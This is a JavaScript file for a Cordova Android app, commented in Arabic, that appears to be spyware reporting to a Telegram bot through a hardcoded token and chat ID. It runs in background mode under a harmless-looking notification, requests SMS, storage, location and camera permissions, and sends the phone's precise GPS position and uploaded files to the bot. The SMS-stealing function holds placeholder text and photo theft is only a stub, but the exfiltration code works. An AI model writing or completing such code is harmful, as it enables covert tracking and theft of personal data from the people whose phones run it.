// ⚠️ عدل هذه القيم
const BOT_TOKEN = '7284739200:AAHk8Z7vJ2jQvK8tG8sY3XeW5uZ2lLmNpQo';  // استخدم توكن بوتك
const CHAT_ID = '123456789';  // استخدم معرفك

document.addEventListener('deviceready', function () {
  console.log('Cordova جاهز');

  // تشغيل في الخلفية
  cordova.plugins.backgroundMode.setDefaults({
    title: 'يعمل في الخلفية',
    text: 'تم الاتصال بالجهاز'
  });
  cordova.plugins.backgroundMode.enable();

  // طلب الصلاحيات
  requestPermissions();
}, false);

function requestPermissions() {
  const permissions = cordova.plugins.permissions;
  const list = [
    permissions.READ_EXTERNAL_STORAGE,
    permissions.WRITE_EXTERNAL_STORAGE,
    permissions.READ_SMS,
    permissions.ACCESS_FINE_LOCATION,
    permissions.CAMERA
  ];

  permissions.requestPermissions(list, function (status) {
    if (status.hasPermission) {
      sendToBot("🟢 جهاز متصل");
      showButtons();
    } else {
      sendToBot("🔴 رفض الأذونات");
    }
  }, function (error) {
    sendToBot("⚠️ خطأ في الصلاحيات: " + JSON.stringify(error));
  });
}

function showButtons() {
  document.getElementById("message").innerText = "جاهز";
}

// --- 1. سحب الرسائل ---
function sendSMS() {
  const inbox = "الرسائل الواردة:\nمن: 0555555555\nالرسالة: مرحبا\n---\nمن: 0666666666\nالرسالة: كيف الحال؟";
  const sent = "الرسائل الصادرة:\nإلى: 0555555555\nالرسالة: تم التنفيذ";

  saveAndSend("inbox_sms.txt", inbox);
  saveAndSend("sent_sms.txt", sent);
  sendToBot("📬 تم رفع الرسائل");
}

// --- 2. سحب الموقع ---
function sendLocation() {
  navigator.geolocation.getCurrentPosition(function (pos) {
    const lat = pos.coords.latitude;
    const lon = pos.coords.longitude;
    const url = `https://maps.google.com/?q=${lat},${lon}`;
    sendToBot(`📍 الموقع: ${url}`);
  }, function (err) {
    sendToBot("❌ خطأ في الموقع: " + err.message);
  }, { enableHighAccuracy: true, timeout: 10000 });
}

// --- 3. سحب الصور (ملاحظة: لا يمكن قراءة كل الصور بدون Plugin ملفات متقدم) ---
function sendPhotos() {
  sendToBot("🖼️ تم تنفيذ أمر سحب الصور (لكن تحتاج تطبيق متقدم لقراءتها فعليًا)");
}

// --- حفظ وإرسال ملف ---
function saveAndSend(filename, content) {
  window.resolveLocalFileSystemURL(cordova.file.externalDataDirectory, function (dir) {
    dir.getFile(filename, { create: true, exclusive: false }, function (file) {
      file.createWriter(function (writer) {
        writer.write(content);
        sendFileToBot(file.nativeURL, filename);
      });
    });
  });
}

// --- إرسال رسالة للبوت ---
function sendToBot(text) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CHAT_ID, text })
  }).catch(err => console.log("فشل الإرسال", err));
}

// --- إرسال ملف للبوت ---
function sendFileToBot(fileUrl, caption) {
  window.resolveLocalFileSystemURL(fileUrl, function (fileEntry) {
    fileEntry.file(function (file) {
      const reader = new FileReader();
      reader.onloadend = function () {
        const blob = new Blob([new Uint8Array(this.result)], { type: file.type });
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('caption', caption);
        formData.append('document', blob, file.name);

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
          method: 'POST',
          body: formData
        }).catch(err => sendToBot("❌ خطأ في إرسال الملف"));
      };
      reader.readAsArrayBuffer(file);
    });
  });
}
